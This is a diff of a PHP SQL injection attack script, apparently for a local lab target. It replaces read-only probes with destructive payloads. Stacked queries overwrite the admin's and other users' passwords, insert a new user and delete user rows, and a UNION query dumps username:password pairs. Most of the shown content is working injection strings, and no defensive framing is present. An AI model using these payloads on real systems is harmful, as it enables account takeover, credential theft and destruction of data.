@@ -4,13 +4,20 @@
 $target = "http://localhost:8080/index.php";
 
 $payloads = [
-    "' OR 1=1-- ",
-    "' OR '1'='1",
-    "admin'--",
-    " ' UNION SELECT 1,version(),3-- -",
-    "' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- -",
-    "' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -",
+    "' OR 1=1; UPDATE users SET password='hacked' WHERE username='admin'; --",
+    "'; UPDATE users SET password='123456' WHERE id=2; --",
+    "'; INSERT INTO users (username, password) VALUES ('newuser', 'pass123'); --",
+    "'; UPDATE users SET password=CONCAT(password, '_changed') WHERE username='user3'; --",
+    "'; DELETE FROM users WHERE username='user10'; --",
     "' UNION SELECT 1,CONCAT(username,':',password),3 FROM users-- -",
+    "' OR 1=1-- ",
+    "' OR '1'='1'-- ",
+    "'; DELETE FROM users WHERE username LIKE 'user%'; --",
+    "' OR 'a'='a' UNION SELECT 1,'admin','password'-- -",
+    "' UNION SELECT 1,version(),3-- -",
+    "' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -",
+
+
 ];
 
 foreach ($payloads as $payload) {
@@ -47,7 +54,7 @@ foreach ($payloads as $payload) {
                 echo "    Versione non trovata\n";
             }
 
-        } elseif (preg_match("/(?i)\bunion\b\s+select\b/", $payload)) {
+        } elseif (preg_match("/(?i)\bUNION\b\s+SELECT\b/", $payload)) {
             echo "[!] VULNERABILE!\n";
 
             $snippet = substr($response, strpos($response, "ID:"), 2000); // estendi per più dati
